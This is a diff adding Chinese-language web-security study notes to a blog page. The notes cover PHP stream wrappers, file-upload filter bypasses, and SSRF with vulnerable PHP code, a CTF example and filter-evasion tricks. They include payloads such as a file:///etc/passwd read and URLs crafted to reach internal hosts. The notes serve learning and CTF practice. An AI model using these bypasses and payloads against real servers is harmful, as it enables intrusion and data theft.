+<h4 id="file-x2F-x2F"><a href="#file-x2F-x2F" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h4><p>用于访问本地文件系统，存在<code>fopen</code>和<code>file_get_contents</code>函数时可用，如，<code>file:///etc/passwd</code></p>
+<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p><code>dict://</code> 字典服务器协议，访问字典资源，如，<code>dict:///ip:6739/info：</code></p>
+<p><code>sftp://</code> SSH文件传输协议或安全文件传输协议</p>
+<p><code>ldap://</code> 轻量级目录访问协议</p>
+<p><code>tftp://</code> 简单文件传输协议</p>
+<p><code>gopher://</code> 分布式文档传递服务，可使用<code>gopherus</code>生成<code>payload</code></p>
+<p><code>zip://文件路径/压缩包名称/压缩包中文件名称</code></p>
+<p><code>phar://文件路径/phar文件名称/phar内文件名</code>：也可以访问<code>zip</code>压缩包内容</p>
+<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>前端检查扩展名：抓包改文件类型为<code>php</code></p>
+<p><code>Content-Type</code> 检测文件类型：抓包改<code>Content-Type</code>符合白名单</p>
+<p>服务器添加后缀：<code>%00</code>截断</p>
+<p>服务器检测扩展名：利用解析漏洞</p>
+<p><code>Apache</code>解析：<code>Apache</code>对后缀解析是从右向左的,<code>phpshell.php.rar.rar.rar.rar</code> 因为<code>Apache</code>不认识<code>.rar</code>会一直遍历后缀到 <code>.php</code></p>
+<p><code>IIS</code>解析：文件名为 <code>abc.asp;xx.jpg</code> 时，会将其解析为 <code>abc.asp</code></p>
+<p><code>PHP CGI</code>路径解析：访问 <code>http://www.a.com/path/test.jpg/notexist.php</code> 时，会将<code>test.jpg</code>当做<code>PHP</code>解析，<code>notexist.php</code>是不存在的文件</p>
+<p>其他方式：后缀大小写、双写（只检测一次<code>php</code>则双写为<code>pphphp</code>，要在<code>php</code>里面双写，不能写连续两个<code>php</code>）、特殊后缀<code>php5</code>，修改包内容大小写过<code>WAF</code></p>
+<h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p>服务端请求伪造，服务端提供了<strong>从其他服务器应用获取数据的功能</strong>且没有对目标地址作过滤和限制，可以利用<code>dict / gopher / file</code>协议</p>
+<ul>
+<li><p>阻碍利用</p>
+<p>服务器开启<code>OpenSSL</code>无法进行交互利用</p>
+<p>服务端需要鉴权（<code>Cookies &amp; User：Pass</code>）不能完美利用</p>
+<p>限制请求的端口为<code>http</code>常用的端口，比如，<code>80,443,8080,8090</code></p>
+<p>禁用不需要的协议。仅仅允许<code>http</code>和<code>https</code>请求，防止类似于<code>file:///,gopher://,ftp://</code>等引起的问题</p>
+<p>统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态</p>
+</li>
+<li><p>常见后端实现：存在<code>fsockopen / file_get_contents / curl_exec</code></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">$content = file_get_contents($_POST['url']);
+
+$fp = fsockopen($host, intval($port), $errno, $errstr, 30); 
+
+<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token variable">$link</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$curlobj</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_POST</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span><span class="token variable">$link</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'./curled/'</span><span class="token operator">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'.txt'</span><span class="token punctuation">;</span>
+    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+    <span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+</li>
+<li><p>例题</p>
+<p><code>@</code>绕过<code>challenge=http://jasmineaura.github.io@challenge.basectf.fun:21758/</code></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$challenge</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'http://jasmineaura.github.io'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token number">0</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'这不是 Aura 的博客！'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token variable">$blog_content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$challenge</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$blog_content</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'已经收到Kengwang的礼物啦'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'请去博客里面写下感想哦~'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>利用<code>file</code>协议：<code>http://127.0.0.1:64686/index.php?url=file:///etc/passwd</code></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+<span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">...</span>
+
+<span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$image_info</span> <span class="token operator">=</span> <span class="token function">getimagesizefromstring</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$mime_type</span> <span class="token operator">=</span> <span class="token variable">$image_info</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'mime'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-Type: '</span> <span class="token operator">.</span> <span class="token variable">$mime_type</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">echo</span> <span class="token variable">$res</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+</li>
+<li><p>绕过</p>
+<p>更改<code>IP</code>地址写法：改成其他进制（<code>8</code>进制，<code>16</code>进制，<code>10</code>进制整数，<code>16</code>进制整数）</p>
+<p><code>IP</code>地址省略模式：<code>10.0.0.1 -&gt; 10.1</code></p>
+<p>利用后端对<code>URL</code>解析不当：</p>
+<ul>
+<li><p><code>http://www.baidu.com@192.168.0.1/</code>与<code>http://192.168.0.1</code>请求的都是<code>192.168.0.1</code></p>
+</li>
+<li><p>可以指向任意 ip 的域名<code>xip.io</code>：<code>http://127.0.0.1.xip.io/</code>&#x3D;&#x3D;&gt;<code>http://127.0.0.1/</code></p>
+</li>
+<li><p>短地址<code>http://dwz.cn/11SMa</code>&#x3D;&#x3D;&gt;<code>http://127.0.0.1</code></p>
+</li>
+<li><p>利用句号<code>。</code>：<code>127。0。0。1</code>&#x3D;&#x3D;&gt;<code>127.0.0.1</code></p>
+</li>
+<li><p><code>Enclosed alphanumerics</code></p>
+<pre class="line-numbers language-none"><code class="language-none">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.com
+List:
+① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ 
+⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ 
+⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ 
+⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ 
+Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ 
+ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ 
+⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ 
+⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ul>
+</li>
+</ul>
 
                 
             </div>
@@ -3108,7 +3361,7 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">127.3k</span>&nbsp;字
+                class="white-color">130.1k</span>&nbsp;字
             
             
             
